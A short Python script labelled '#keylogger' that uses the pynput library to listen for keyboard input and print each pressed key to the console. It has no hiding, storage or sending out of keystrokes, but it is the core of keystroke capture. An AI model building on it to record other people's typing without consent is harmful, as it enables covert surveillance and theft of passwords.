#keylogger
import time
from pynput import keyboard

def press(key):
    print("Key pressed:", key)

with keyboard.Listener(on_press=press) as listener:
    listener.join()
